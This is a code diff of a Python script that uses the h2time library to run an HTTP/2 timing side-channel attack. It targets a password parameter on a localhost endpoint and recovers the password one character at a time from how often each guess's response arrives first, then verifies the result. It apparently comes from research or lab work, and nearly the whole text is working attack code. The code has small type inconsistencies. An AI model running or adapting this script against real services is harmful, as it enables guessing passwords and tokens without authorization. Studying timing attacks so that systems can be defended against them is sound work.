@@ -2,6 +2,8 @@ from h2time import H2Time, H2Request
 import asyncio
 import string
 import logging
+import json
+import statistics
 
 logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger('research')
@@ -11,64 +13,88 @@ async def create_auth_request(token: str) -> H2Request:
     """Create an H2Request with the specified Authorization token."""
     return H2Request(
         method="GET",
-        url=f"https://localhost:8888/?password={token}$",
+        url=f"https://localhost:8000/process?password={token}",
         headers={
             "User-Agent": "h2time/0.1"
         }
     )
-    
-async def run_two_gets():
-    r1 = H2Request('GET', 'https://tom.vg/?1', {'user-agent': ua})
-    r2 = H2Request('GET', 'https://tom.vg/?2', {'user-agent': ua})
-    logger.info('Starting h2time with 2 GET requests')
-    async with H2Time(r1, r2, num_request_pairs=5) as h2t:
-        results = await h2t.run_attack()
-        print('\n'.join(map(lambda x: ','.join(map(str, x)), results)))
-    logger.info('h2time with 2 GET requests finished')
 
-async def perform_timing_attack(token_prefix: str, char_set: str = string.digits + string.ascii_uppercase) -> str:
+async def perform_timing_attack(token_prefix: str) -> set:
     """Perform a timing attack to find the next character in the token."""
+    # Use the exact character set from our password
+    char_set = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"
     potential_chars = set()
-    best_score = float('-inf')
+    order_results = {}
     
-    for idx in range(len(char_set)):
-        char1 = char_set[idx]
-        char2 = char_set[(idx + 1) % len(char_set)]
-        r1 = await create_auth_request(token_prefix + char1)
-        r2 = await create_auth_request(token_prefix + char2)
+    for char in char_set:   
+        r1 = await create_auth_request(token_prefix + char)
+        r2 = await create_auth_request(token_prefix + "$")  # Control character
         
-        async with H2Time(r1, r2, num_request_pairs=10, send_order_pattern="2", sequential=False, verify_cert=False) as h2t:
+        async with H2Time(r1, r2, 
+                         num_request_pairs=10,
+                         sequential=False,  # Important: Use parallel mode to exploit HTTP/2 multiplexing
+                         inter_request_time_ms=0,  # No delay between requests
+                         verify_cert=False) as h2t:
             results = await h2t.run_attack()
             if results:
-                first_request_quicker = len([r for r in results if r[0] < 0])
-                second_request_quicker = len([r for r in results if r[0] > 0])
-                diff = abs(first_request_quicker - second_request_quicker)
-                logger.info(f"{char1} {char2} diff: {diff}, t1 avg: {sum(int(r[0]) for r in results) / len(results)}")
+                # Count how many times r1 (test char) came before r2 (control)
+                r1_first = len([r for r in results if r[0] < 0])
+                r2_first = len([r for r in results if r[0] > 0])
+                total = r1_first + r2_first
                 
-                if diff:
-                    potential_chars.add(char1)
+                if total > 0:
+                    # Calculate percentage of times r1 came first
+                    r1_first_percent = (r1_first / total) * 100
+                    order_results[char] = r1_first_percent
                     
-    logger.info(f"Potential chars: {potential_chars}")               
+                    logger.info(f"Char: {char}, R1 first: {r1_first}/{total} ({r1_first_percent:.1f}%)")
+                    
+                    # If r1 comes first significantly more often, it's likely correct
+                    if r1_first_percent > 60:  # More than 60% of the time
+                        potential_chars.add(char)
+                        
+                    # If r1 comes first 100% of the time, it's almost certainly correct
+                    if r1_first_percent == 100:
+                        return [(char, f'{r1_first_percent:.1f}%')]
     
-    return potential_chars
+    # Sort and log potential characters by response order percentage
+    sorted_chars = sorted(order_results.items(), key=lambda x: x[1], reverse=True)
+    logger.info(f"Top 3 potential chars by response order: {[(c, f'{p:.1f}%') for c, p in sorted_chars[:3]]}")
+    
+    return sorted_chars
 
 async def find_token() -> str:
     """Find the complete token using timing attacks."""
     token = ""
-    potential_chars = []
-    while True:
+    max_length = 8  # We know the password is 8 characters
+    
+    while len(token) < max_length:
         next_char_set = await perform_timing_attack(token)
         if not next_char_set:
+            logger.warning(f"No clear response order difference found for position {len(token)}")
             break
-        potential_chars.append(next_char_set)
-        if len(potential_chars) == 1:
-            token += potential_chars[0]
-        print(f"Found token so far: {token}")
+            
+        # Take the character with the highest response order percentage
+        if len(next_char_set) == 1:
+            token += next_char_set.pop()[0]
+            logger.info(f"Found token so far: {token}")
+        else:
+            # If multiple potential chars, take the one with highest response order percentage
+            token += next_char_set[0][0]
+            logger.info(f"Multiple potential chars found, selected {next_char_set[0]}. Token so far: {token}")
     
     if token:
-        print(f"Found token: {token}")
+        logger.info(f"Found complete token: {token}")
+        # Verify the token
+        verify_request = await create_auth_request(token)
+        async with H2Time(verify_request, verify_request, num_request_pairs=1, verify_cert=False) as h2t:
+            results = await h2t.run_attack()
+            if results and results[0][1] == "200":
+                logger.info("Token verified successfully!")
+            else:
+                logger.warning("Token verification failed!")
     else:
-        print("No token found - endpoint not vulnerable")
+        logger.error("No token found - endpoint not vulnerable")
 
     return token
 
